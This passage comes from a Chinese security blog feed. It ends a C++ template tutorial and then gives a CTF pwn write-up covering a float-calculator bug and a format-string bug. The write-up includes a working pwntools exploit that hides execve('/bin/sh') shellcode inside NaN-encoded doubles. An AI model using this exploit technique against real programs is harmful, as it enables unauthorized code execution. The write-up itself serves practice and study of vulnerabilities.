class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 通用函数模板</span></span><br><span class="line"><span class="keyword">template</span> &lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="function">T <span class="title">max</span><span class="params">(T a, T b)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;General template&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> (a &gt; b) ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 特化函数模板，用于比较 const char* 类型</span></span><br><span class="line"><span class="keyword">template</span> &lt;&gt;</span><br><span class="line"><span class="function"><span class="type">const</span> <span class="type">char</span>* <span class="title">max</span><span class="params">(<span class="type">const</span> <span class="type">char</span>* a, <span class="type">const</span> <span class="type">char</span>* b)</span> </span>&#123;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Specialized template&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">return</span> (std::<span class="built_in">strcmp</span>(a, b) &gt; <span class="number">0</span>) ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> a = <span class="number">5</span>, b = <span class="number">10</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Max of &quot;</span> &lt;&lt; a &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; b &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; <span class="built_in">max</span>(a, b) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* x = <span class="string">&quot;apple&quot;</span>;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span>* y = <span class="string">&quot;banana&quot;</span>;</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;Max of &quot;</span> &lt;&lt; x &lt;&lt; <span class="string">&quot; and &quot;</span> &lt;&lt; y &lt;&lt; <span class="string">&quot; is &quot;</span> &lt;&lt; <span class="built_in">max</span>(x, y) &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个示例中，我们为 <code>max</code> 函数模板提供了一个特化版本，专门用于比较 <code>const char*</code> 类型的字符串。</p><p>这些示例展示了C++模板的基本用法，包括函数模板、类模板和模板特化。模板是C++中实现泛型编程的关键特性，它允许你编写高度可重用的代码。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;本篇blog是读者所总结（cv大法均有包含出处，笔者水平有限，如果错误请指出（主要期末考总结了一下方便考前再次复习&lt;/p&gt;
&lt;h2 id=&quot;</summary>
      
    
    
    
    <category term="总结" scheme="http://s1nec-1o.github.io/categories/%E6%80%BB%E7%BB%93/"/>
    
    <category term="C++" scheme="http://s1nec-1o.github.io/categories/%E6%80%BB%E7%BB%93/C/"/>
    
    
    <category term="开发" scheme="http://s1nec-1o.github.io/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>一些题目(format和ieee标准)</title>
    <link href="http://s1nec-1o.github.io/2024/05/03/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE-format%E5%92%8Cieee%E6%A0%87%E5%87%86/"/>
    <id>http://s1nec-1o.github.io/2024/05/03/%E4%B8%80%E4%BA%9B%E9%A2%98%E7%9B%AE-format%E5%92%8Cieee%E6%A0%87%E5%87%86/</id>
    <published>2024-05-03T11:24:30.000Z</published>
    <updated>2024-05-03T11:25:15.483Z</updated>
    
    <content type="html"><![CDATA[<h1 id="题目复现"><a href="#题目复现" class="headerlink" title="题目复现"></a>题目复现</h1><h1 id="float"><a href="#float" class="headerlink" title="float"></a>float</h1><h2 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> a1, <span class="type">char</span> **a2, <span class="type">char</span> **a3)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">double</span> *v5; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE v6[<span class="number">12</span>]; <span class="comment">// [rsp+8h] [rbp-50h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [rsp+14h] [rbp-44h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+18h] [rbp-40h]</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// [rsp+1Ch] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">double</span> *v10; <span class="comment">// [rsp+20h] [rbp-38h]</span></span><br><span class="line">  <span class="type">void</span> *s; <span class="comment">// [rsp+28h] [rbp-30h]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+30h] [rbp-28h]</span></span><br><span class="line">  <span class="type">double</span> v13; <span class="comment">// [rsp+38h] [rbp-20h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v14; <span class="comment">// [rsp+40h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v14 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">400LL</span>);</span><br><span class="line">  s = v6;</span><br><span class="line">  v4 = alloca(<span class="number">64LL</span>);</span><br><span class="line">  buf = v6;</span><br><span class="line">  <span class="built_in">memset</span>(v6, <span class="number">0</span>, <span class="number">0x180</span>uLL);</span><br><span class="line">  <span class="built_in">memset</span>(buf, <span class="number">0</span>, <span class="number">0x30</span>uLL);</span><br><span class="line">  qword_40E0 = s;                               <span class="comment">// 存栈地址</span></span><br><span class="line">  dword_4010 = <span class="number">0</span>;</span><br><span class="line">  sub_1384();</span><br><span class="line">  sub_14C9();</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = read(<span class="number">0</span>, buf, <span class="number">0x180</span>uLL);                <span class="comment">// 栈溢出</span></span><br><span class="line">    <span class="keyword">if</span> ( v7 &gt; <span class="number">47</span> )</span><br><span class="line">      v7 = <span class="number">48</span>;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; v7 &amp;&amp; *(buf + i) != <span class="string">&#x27;\n&#x27;</span>; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(buf + i) &lt;= <span class="string">&#x27; &#x27;</span> || *(buf + i) &gt; <span class="string">&#x27;0&#x27;</span> )<span class="comment">// 0的情况未包括</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">if</span> ( *(buf + i) &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; *(buf + i) &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ( dword_4010 &gt; <span class="number">47</span> )                <span class="comment">// 只能运算48次</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++dword_4010;</span><br><span class="line">          v5 = qword_40E0;</span><br><span class="line">          *v5 = atof(buf + i);</span><br><span class="line">          qword_40E0 += <span class="number">8LL</span>;</span><br><span class="line">          <span class="keyword">while</span> ( *(buf + i + <span class="number">1</span>) == <span class="string">&#x27;.&#x27;</span> || *(buf + i + <span class="number">1</span>) &gt; <span class="string">&#x27;/&#x27;</span> &amp;&amp; *(buf + i + <span class="number">1</span>) &lt;= <span class="string">&#x27;9&#x27;</span> )</span><br><span class="line">            ++i;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;                                         <span class="comment">// 符号处理（0也包括在里面，导致漏洞</span></span><br><span class="line">        <span class="keyword">if</span> ( dword_4010 &lt;= <span class="number">1</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;ERROR&quot;</span>);</span><br><span class="line">          <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = s;</span><br><span class="line">        <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">47</span>; ++j )</span><br><span class="line">        &#123;</span><br><span class="line">          v13 = <span class="built_in">fabs</span>(*v10);</span><br><span class="line">          <span class="keyword">if</span> ( v13 != <span class="number">0.0</span> &amp;&amp; (v13 &lt; <span class="number">1.0</span> || v13 &gt; <span class="number">100.0</span>) )<span class="comment">// 不满足即可使用伪造NaN</span></span><br><span class="line">          &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;ERROR: %lf\n&quot;</span>, v13);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v10;</span><br><span class="line">        &#125;</span><br><span class="line">        (func_list[*(buf + i) - <span class="number">0x20</span>])();       <span class="comment">// 如果为0，会执行func_list[0x30 - 0x20]()</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( s &lt; qword_40E0 )</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;Result: %lf\n&quot;</span>, *(qword_40E0 - <span class="number">8</span>));<span class="comment">// 依靠ASCII码寻找到对应的函数</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当为0的时候就会有</p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405031925682.png" alt="image-20240502170138697" style="zoom:50%;" /><p>而<code>qword_40E0 = s;</code> ，是栈上的指针，那么就会执行栈上的shellcode，现在只需要找到站上的shellcode是怎么回事即可</p><p>本题目的大概逻辑是：首先大体是一个浮点数计算的程序，它有着加减乘除的功能，它每读进一个数，就会将其保存在栈上，以IEEE浮点表示形式，其中每次读进的值要不满足<code>a!=0 &amp;&amp; (a&lt;1.0 || a&gt;100.0)</code>的条件，然而在判断a时，有一个纰漏便是在判断符号的时候将0也攘括进去了，因此导致了一个栈上shellcode的执行</p><p>动态调试的部分边省略，主要还是对上述的验证</p><p>IEEE标准的浮点形式的double型主要是1位的符号位，11位的指数位，52位的有效数，其中指数位是要再加上一个偏移1027即011111111111，例如1的浮点形式便是0 0111111111111 000000000…….00000000</p><p>而浮点形式的特殊情况便是NaN，表示0&#x2F;0等无意义的形式，其中</p><p>NaN 的两个特殊属性是：</p><ol><li><strong>与其他浮点数（包括 NaN 和 ±∞</strong> ）的比较结果：</li></ol><table><thead><tr><th>比较</th><th>NaN ≥ x</th><th>NaN ≤ x</th><th>NaN &gt; x</th><th>NaN &lt; x</th><th>NaN &#x3D; x</th><th>NaN ≠ x</th></tr></thead><tbody><tr><td>结果</td><td>False</td><td>False</td><td>False</td><td>False</td><td>False</td><td>True</td></tr></tbody></table><ol><li>它有许多可能的编码，允许它携带其他信息，例如指示 NaN 来源的诊断信息。例如：</li></ol><p>double-64 NaN：<code>s111 1111 1111 xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx xxxx</code> （其中<em>s</em>是符号，<em>x</em>序列表示非零数字（零值编码表示无穷大））</p><p>因此如果直接以NaN表示的话那个条件便是不成立的，就能直接构造shellcode</p><h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">pc = <span class="string">&#x27;./fcalc&#x27;</span></span><br><span class="line">aslr = <span class="literal">True</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="comment">#context.terminal = [&quot;deepin-terminal&quot;,&quot;-m&quot;,&quot;splitscreen&quot;,&quot;-e&quot;,&quot;bash&quot;,&quot;-c&quot;]</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)</span><br><span class="line">elf = ELF(pc)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    <span class="comment">#p = process(pc,aslr=aslr,env=&#123;&#x27;LD_PRELOAD&#x27;: &#x27;./libc.so.6&#x27;&#125;)</span></span><br><span class="line">    p = process(pc,aslr=aslr)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    remote_addr = [<span class="string">&#x27;node4.buuoj.cn&#x27;</span>, <span class="number">6666</span>]</span><br><span class="line">    p = remote(remote_addr[<span class="number">0</span>], remote_addr[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">ru  = <span class="keyword">lambda</span> x   : p.recvuntil(x)</span><br><span class="line">sn  = <span class="keyword">lambda</span> x   : p.send(x)</span><br><span class="line">rl  = <span class="keyword">lambda</span>     : p.recvline()</span><br><span class="line">sl  = <span class="keyword">lambda</span> x   : p.sendline(x)</span><br><span class="line">rv  = <span class="keyword">lambda</span> x   : p.recv(x)</span><br><span class="line">sa  = <span class="keyword">lambda</span> a,b : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b : p.sendlineafter(a,b)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    payload = <span class="string">&#x27;1 1 0&#x27;</span>.ljust(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    payload += p64(<span class="number">0x7FFFFFFFFFFFFFFF</span>)*<span class="number">2</span> <span class="comment"># frist two doubles in the stack (padding)</span></span><br><span class="line"></span><br><span class="line">    jmpn = <span class="string">b&quot;\xEB\x02&quot;</span></span><br><span class="line">    NaNHeader = <span class="string">b&quot;\xFF\x7F&quot;</span></span><br><span class="line">    <span class="comment"># 0:  31 c0                   xor    eax,eax</span></span><br><span class="line">    <span class="comment"># 2:  31 db                   xor    ebx,ebx</span></span><br><span class="line">    <span class="comment"># 4:  66 b8 3b 00             mov    ax,0x3b</span></span><br><span class="line">    <span class="comment"># 8:  66 bb 68 00             mov    bx,0x68</span></span><br><span class="line">    <span class="comment"># c:  48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line">    <span class="comment"># 10: 66 bb 2f 73             mov    bx,0x732f</span></span><br><span class="line">    <span class="comment"># 14: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line">    <span class="comment"># 18: 66 bb 69 6e             mov    bx,0x6e69</span></span><br><span class="line">    <span class="comment"># 1c: 48 c1 e3 10             shl    rbx,0x10</span></span><br><span class="line">    <span class="comment"># 20: 66 bb 2f 62             mov    bx,0x622f</span></span><br><span class="line">    <span class="comment"># 24: 53                      push   rbx</span></span><br><span class="line">    <span class="comment"># 25: 48 89 e7                mov    rdi,rsp</span></span><br><span class="line">    <span class="comment"># 28: 31 f6                   xor    esi,esi</span></span><br><span class="line">    <span class="comment"># 2a: 31 d2                   xor    edx,edx</span></span><br><span class="line">    <span class="comment"># 2c: 0f 05                   syscall</span></span><br><span class="line">    payload += <span class="string">&#x27;\x31\xc0\x31\xdb&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xb8\x3b\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xbb\x68\x00&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xbb\x2f\x73&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xbb\x69\x6e&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x48\xc1\xe3\x10&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x66\xbb\x2f\x62&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x53\x48\x89\xe7&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x31\xf6\x31\xd2&#x27;</span> + jmpn + NaNHeader</span><br><span class="line">    payload += <span class="string">&#x27;\x0f\x05\x90\x90&#x27;</span> + jmpn + NaNHeader    <span class="comment"># \x90 is nop</span></span><br><span class="line"></span><br><span class="line">    ru(<span class="string">&#x27;expression:\n&#x27;</span>)</span><br><span class="line">    sn(payload)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405031925684.png" alt="image-20240502202506903" style="zoom:50%;" /><h1 id="format"><a href="#format" class="headerlink" title="format"></a>format</h1><h2 id="静态分析-1"><a href="#静态分析-1" class="headerlink" title="静态分析"></a>静态分析</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *v3; <span class="comment">// rbx</span></span><br><span class="line">  <span class="type">char</span> v5; <span class="comment">// [rsp+15h] [rbp-14Bh]</span></span><br><span class="line">  __int16 v6; <span class="comment">// [rsp+16h] [rbp-14Ah]</span></span><br><span class="line">  <span class="type">char</span> *lineptr; <span class="comment">// [rsp+18h] [rbp-148h] BYREF</span></span><br><span class="line">  <span class="type">size_t</span> n; <span class="comment">// [rsp+20h] [rbp-140h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *ptr; <span class="comment">// [rsp+28h] [rbp-138h] BYREF</span></span><br><span class="line">  __int64 temp_size; <span class="comment">// [rsp+30h] [rbp-130h] BYREF</span></span><br><span class="line">  <span class="type">void</span> *ptr1; <span class="comment">// [rsp+38h] [rbp-128h] BYREF</span></span><br><span class="line">  <span class="type">char</span> format[<span class="number">264</span>]; <span class="comment">// [rsp+40h] [rbp-120h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v13; <span class="comment">// [rsp+148h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v13 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>, <span class="number">2</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Submit replay as hex (use xxd -p -c0 replay.osr | ./analyzer):&quot;</span>);</span><br><span class="line">    lineptr = <span class="number">0LL</span>;</span><br><span class="line">    n = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">if</span> ( getline(&amp;lineptr, &amp;n, <span class="built_in">stdin</span>) &lt;= <span class="number">0</span> )    <span class="comment">// 读取到lineptr一行字符</span></span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    v3 = lineptr;</span><br><span class="line">    v3[<span class="built_in">strcspn</span>(lineptr, <span class="string">&quot;\n&quot;</span>)] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( !*lineptr )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    temp_size = hexs2bin(lineptr, &amp;ptr);</span><br><span class="line">    ptr1 = ptr;</span><br><span class="line">    <span class="keyword">if</span> ( !temp_size )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Error: failed to decode hex&quot;</span>);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\n=~= miss-analyzer =~=&quot;</span>);</span><br><span class="line">    v5 = read_byte(&amp;ptr1, &amp;temp_size);          <span class="comment">// 读一个字节</span></span><br><span class="line">    <span class="keyword">if</span> ( v5 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">switch</span> ( v5 )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;nothing now.&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;nothing now.&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">          <span class="built_in">puts</span>(<span class="string">&quot;nothing now.&quot;</span>);</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;default&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    consume_bytes(&amp;ptr1, &amp;temp_size, <span class="number">4LL</span>);      <span class="comment">// 读4个字节</span></span><br><span class="line">    read_string(&amp;ptr1, &amp;temp_size, format, <span class="number">255LL</span>);<span class="comment">// 读入format</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Hash: %s\n&quot;</span>, format);</span><br><span class="line">    read_string(&amp;ptr1, &amp;temp_size, format, <span class="number">255LL</span>);<span class="comment">// 再次读入format</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Player name: &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(format);                             <span class="comment">// 格式化字符串漏洞</span></span><br><span class="line">    <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">    read_string(&amp;ptr1, &amp;temp_size, format, <span class="number">255LL</span>);<span class="comment">// 再次读入format</span></span><br><span class="line">    consume_bytes(&amp;ptr1, &amp;temp_size, <span class="number">10LL</span>);     <span class="comment">// 读10个字节</span></span><br><span class="line">    v6 = read_short(&amp;ptr1, &amp;temp_size);         <span class="comment">// 读2个字节</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Miss count: %d\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)v6);</span><br><span class="line">    <span class="keyword">if</span> ( v6 )</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Yep, looks like you missed.&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;You didn&#x27;t miss!&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;=~=~=~=~=~=~=~=~=~=~=\n&quot;</span>);</span><br><span class="line">    <span class="built_in">free</span>(lineptr);</span><br><span class="line">    <span class="built_in">free</span>(ptr);     </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>本题的静态分析十分困难，而且脚本的编写也很困难，算是长见识了。。（第一次脚本没写出来</p><p>先看read_string函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span 